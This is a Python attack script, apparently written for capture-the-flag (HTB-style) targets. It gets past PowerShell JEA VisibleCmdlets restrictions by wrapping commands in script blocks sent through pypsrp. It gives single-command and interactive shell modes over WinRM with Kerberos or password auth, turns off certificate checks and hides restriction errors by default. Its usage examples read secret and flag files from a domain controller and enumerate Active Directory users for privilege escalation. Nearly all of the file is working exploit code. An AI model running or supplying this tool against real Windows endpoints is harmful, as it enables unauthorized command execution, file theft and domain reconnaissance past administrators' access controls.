#!/usr/bin/env python3
r"""
jea_bypass.py — JEA ConstrainedLanguageMode bypass via pypsrp script block injection

VULNERABILITY:
    JEA endpoints configured with LanguageMode = 'ConstrainedLanguage' (instead of
    'NoLanguage') are bypassable. While VisibleCmdlets restricts interactive sessions
    to a defined allow-list, pypsrp's PowerShell.add_script() sends commands via the
    PSRP protocol at a lower level. Wrapping commands in & { ... } script blocks
    allows execution of cmdlets outside the VisibleCmdlets list.
    ConstrainedLanguageMode still applies (no arbitrary .NET calls), but basic
    PowerShell cmdlets (Get-ChildItem, Get-Content, whoami, etc.) work fine.

    NOT bypassable when LanguageMode = 'NoLanguage' is set.

PRE-REQUISITES:
    pip install pypsrp          # WinRM/PSRP client library
    pip install gssapi          # Kerberos GSSAPI bindings (Linux)
    pip install krb5            # Kerberos support for pypsrp
    # or: pip install pypsrp[kerberos]

    Kerberos (recommended, for Kerberos-only environments):
        export KRB5CCNAME=/path/to/account.ccache
        export KRB5_CONFIG=/path/to/krb5.conf   # if non-default realm config needed

    Password-based (if NTLM or basic auth is available):
        pass -u / -p flags instead of -k

USAGE:
    # Single command
    python3 jea_bypass.py -t dc1.target.htb -u 'svc$@REALM.HTB' -e 'restricted' \
        -c 'whoami'

    # Interactive shell loop
    python3 jea_bypass.py -t dc1.target.htb -u 'svc$@REALM.HTB' -e 'restricted' \
        --shell

    # Password auth (no Kerberos)
    python3 jea_bypass.py -t dc1.target.htb -u 'DOMAIN\user' -p 'Password1' \
        -e 'restricted' -c 'Get-Content C:\flag.txt'

    # Read a file
    python3 jea_bypass.py -t dc1.target.htb -u 'svc$@REALM.HTB' -e 'restricted' \
        -c 'Get-Content "C:\\Users\\svc\\Documents\\secret.txt"'

    # List a directory
    python3 jea_bypass.py -t dc1.target.htb -u 'svc$@REALM.HTB' -e 'restricted' \
        -c 'ls "C:\\Users\\svc\\Documents\\"'

    # Check writable DACL objects (useful for AD priv-esc)
    python3 jea_bypass.py -t dc1.target.htb -u 'svc$@REALM.HTB' -e 'restricted' \
        -c 'Get-ADUser -Filter * | Select-Object Name,SamAccountName'
"""

import argparse
import os
import sys

try:
    from pypsrp.wsman import WSMan
    from pypsrp.powershell import RunspacePool, PowerShell
except ImportError:
    print("[!] pypsrp not installed. Run: pip install pypsrp pypsrp[kerberos]")
    sys.exit(1)


BANNER = r"""
     _ _____ ___      _
    | | ____|/ _ \   | |__  _   _ _ __   __ _ ___ ___
 _  | |  _| | |_| |  | '_ \| | | | '_ \ / _` / __/ __|
| |_| | |___|  _  |  | |_) | |_| | |_) | (_| \__ \__ \\
 \___/|_____|_| |_|  |_.__/ \__, | .__/ \__,_|___/___/
                              |___/|_|
  ConstrainedLanguageMode bypass via pypsrp script block injection
"""


def run_command(ws, configuration, command, verbose=False):
    """Execute a single command in the JEA session via script block injection."""
    with RunspacePool(ws, configuration_name=configuration) as rp:
        ps = PowerShell(rp)
        # Wrap in & { ... } to bypass VisibleCmdlets restriction
        ps.add_script(f"& {{ {command} }}")
        output = ps.invoke()

        results = []
        for o in output:
            results.append(str(o))
            print(str(o))

        if ps.streams.error:
            for e in ps.streams.error:
                err = str(e)[:300]
                if verbose:
                    print(f"[ERR] {err}", file=sys.stderr)
                else:
                    # Suppress non-fatal JEA restriction warnings
                    if "is not recognized" not in err and "cannot be loaded" not in err:
                        print(f"[ERR] {err}", file=sys.stderr)

        return results


def build_wsman(target, username, password, kerberos, port, ssl):
    """Build WSMan connection object."""
    if kerberos:
        ws = WSMan(
            target,
            username=username,
            auth="kerberos",
            ssl=ssl,
            cert_validation=False,
            port=port,
        )
    else:
        if not password:
            print("[!] Password required when not using Kerberos (-p)")
            sys.exit(1)
        ws = WSMan(
            target,
            username=username,
            password=password,
            auth="negotiate",
            ssl=ssl,
            cert_validation=False,
            port=port,
        )
    return ws


def interactive_shell(ws, configuration, verbose):
    """Simple interactive shell loop."""
    print(f"[*] JEA bypass shell — configuration: '{configuration}'")
    print("[*] Type 'exit' or Ctrl+C to quit\n")
    while True:
        try:
            cmd = input("PS> ").strip()
            if not cmd:
                continue
            if cmd.lower() in ("exit", "quit", "q"):
                break
            run_command(ws, configuration, cmd, verbose)
        except KeyboardInterrupt:
            print("\n[*] Exiting")
            break
        except Exception as e:
            print(f"[!] Error: {e}", file=sys.stderr)


def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="JEA ConstrainedLanguageMode bypass via pypsrp",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )

    # Target
    parser.add_argument("-t", "--target",  required=True,
                        help="Target hostname or IP (e.g. dc1.domain.htb)")
    parser.add_argument("-e", "--endpoint", required=True,
                        help="JEA configuration name (e.g. 'restricted')")
    parser.add_argument("--port", type=int, default=5985,
                        help="WinRM port (default: 5985)")
    parser.add_argument("--ssl", action="store_true",
                        help="Use HTTPS/SSL (port 5986)")

    # Auth
    parser.add_argument("-u", "--username", required=True,
                        help="Username — for Kerberos use UPN format: user@REALM.HTB")
    parser.add_argument("-p", "--password", default=None,
                        help="Password (plaintext). Omit for Kerberos.")
    parser.add_argument("-k", "--kerberos", action="store_true",
                        help="Use Kerberos auth (reads KRB5CCNAME / KRB5_CONFIG from env)")
    parser.add_argument("--ccache", default=None,
                        help="Path to ccache file (sets KRB5CCNAME env var)")
    parser.add_argument("--krb-conf", default=None,
                        help="Path to krb5.conf (sets KRB5_CONFIG env var)")

    # Execution
    parser.add_argument("-c", "--command", default=None,
                        help="Single command to execute and exit")
    parser.add_argument("--shell", action="store_true",
                        help="Drop into interactive shell loop")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show all errors including JEA restriction messages")

    args = parser.parse_args()

    # Apply Kerberos env overrides
    if args.ccache:
        os.environ["KRB5CCNAME"] = args.ccache
        print(f"[*] KRB5CCNAME set to: {args.ccache}")
    if args.krb_conf:
        os.environ["KRB5_CONFIG"] = args.krb_conf
        print(f"[*] KRB5_CONFIG set to: {args.krb_conf}")

    if args.kerberos:
        ccache = os.environ.get("KRB5CCNAME", "")
        if not ccache:
            print("[!] Kerberos selected but KRB5CCNAME is not set")
            sys.exit(1)
        print(f"[*] Using Kerberos — ccache: {ccache}")

    port = 5986 if args.ssl else args.port
    print(f"[*] Target   : {args.target}:{port}")
    print(f"[*] User     : {args.username}")
    print(f"[*] Endpoint : {args.endpoint}")
    print(f"[*] Auth     : {'kerberos' if args.kerberos else 'negotiate'}\n")

    ws = build_wsman(args.target, args.username, args.password,
                     args.kerberos, port, args.ssl)

    if args.command:
        run_command(ws, args.endpoint, args.command, args.verbose)
    elif args.shell:
        interactive_shell(ws, args.endpoint, args.verbose)
    else:
        # Default: drop into interactive shell
        interactive_shell(ws, args.endpoint, args.verbose)


if __name__ == "__main__":
    main()
